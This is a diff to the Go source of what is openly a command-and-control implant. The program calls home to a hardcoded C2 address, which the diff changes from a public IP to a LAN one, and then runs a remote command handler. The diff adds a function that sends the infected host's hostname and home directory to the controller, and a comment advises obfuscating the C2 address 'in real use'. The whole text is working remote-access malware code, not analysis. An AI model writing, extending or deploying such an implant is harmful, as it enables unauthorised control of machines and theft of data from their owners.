@@ -4,6 +4,7 @@ import (
 	//"encoding/binary"
 	"encoding/binary"
 	"fmt"
+	"log"
 	"net"
 	"os"
 	"os/exec"
@@ -273,8 +274,27 @@ func unifiedCommandHandler(conn *net.Conn, implantWD *string) {
 	}
 }
 
+func hostinfo(conn net.Conn) bool {
+	hostname, err1 := os.Hostname()
+	user, err2 := os.UserHomeDir()
+
+	if err1 != nil || err2 != nil {
+		log.Println("[-] Error retrieving host info")
+		return false
+	}
+
+	info := hostname + "\n" + user
+	_, err := conn.Write([]byte(info))
+	if err != nil {
+		log.Println("[-] Error writing to connection:", err)
+		return false
+	}
+
+	return true
+}
+
 func main() {
-	c2Address := "89.43.33.169:4321" // Encrypt/decode at runtime in real use
+	c2Address := "192.168.0.102:1234" // Encrypt/decode at runtime in real use
 	attempts := 0
 	implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
@@ -283,7 +303,9 @@ func main() {
 	for !result {
 		conn, result = callHome(&c2Address, &attempts)
 	}
-	go unifiedCommandHandler(&conn, &implantWD)
+	if hostinfo(conn) {
+		go unifiedCommandHandler(&conn, &implantWD)
+	}
 	// Block main from exiting
 	select {}
 }
